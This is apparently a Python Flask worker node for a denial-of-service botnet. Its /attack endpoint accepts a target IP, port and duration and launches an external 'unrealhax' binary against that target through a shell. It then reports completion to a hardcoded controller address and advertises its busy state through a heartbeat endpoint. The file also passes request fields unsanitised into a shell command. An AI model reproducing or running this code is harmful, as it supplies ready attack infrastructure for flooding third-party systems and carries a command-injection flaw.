from flask import Flask, request, jsonify
import asyncio
import logging
import os
import threading
import requests

# Set up logging for the child server
logging.basicConfig(level=logging.INFO)

# Initialize Flask app
app = Flask(__name__)

# Status of the server
server_status = 'idle'

# Payload for acknowledgment to main server
payload = {
    'status': 'completed',
    'server': 'server2'  
}

# Heartbeat endpoint to report the server's status
@app.route('/heartbeat', methods=['GET'])
def heartbeat():
    return jsonify({"status": server_status}), 200

# Async function to run the attack
async def run_attack(ip, port, duration):
    global server_status
    server_status = 'busy'  # Set server status to busy when attack starts
    try:
        # Log the command being executed
        logging.info(f"Running attack command: ./unrealhax {ip} {port} {duration} 10")

        # Execute the attack command asynchronously
        process = await asyncio.create_subprocess_shell(
            f"./unrealhax {ip} {port} {duration} 10",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        output = ""
        if stdout:
            logging.info(f"stdout: {stdout.decode()}")  # Log stdout
            output += f"[stdout]\n{stdout.decode()}\n"
        if stderr:
            logging.info(f"stderr: {stderr.decode()}")  # Log stderr
            output += f"[stderr]\n{stderr.decode()}\n"

        return output if output else "⚠️ No output from the attack command"

    except Exception as e:
        logging.error(f"Error during attack: {str(e)}")
        return f"⚠️ Error during the attack: {str(e)}"

    finally:
        # Reset server status to idle after the attack finishes
        server_status = 'idle'

        # Notify the main server that the attack is finished
        send_acknowledgment()

# Function to send acknowledgment to the main server after attack completes
def send_acknowledgment():
    main_server_url = "http://34.0.0.0:5000/acknowledge"
    try:
        response = requests.post(main_server_url, json=payload)
        if response.status_code == 200:
            logging.info("Acknowledgment sent to main server successfully.")
        else:
            logging.error(f"Failed to send acknowledgment: {response.status_code}")
    except Exception as e:
        logging.error(f"Error sending acknowledgment: {str(e)}")

# Wrapper to run async attack in a new thread
def run_attack_in_thread(ip, port, duration):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(run_attack(ip, port, duration))

# Flask route to handle attack requests
@app.route('/attack', methods=['POST'])
def attack():
    global server_status
    if server_status == 'busy':
        return jsonify({"error": "Server is busy with another attack"}), 503

    data = request.json
    target = data.get('target')
    port = data.get('port')
    time = data.get('time')

    if not target or not port or not time:
        return jsonify({"error": "Missing required fields: target, port, time"}), 400

    # Set the server to busy
    server_status = 'busy'

    # Start the attack in a separate thread
    threading.Thread(target=run_attack_in_thread, args=(target, port, time)).start()

    # Return the response immediately
    return jsonify({"result": "Attack started"}), 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))  # Allow the port to be configurable
    app.run(host='0.0.0.0', port=port, debug=True)
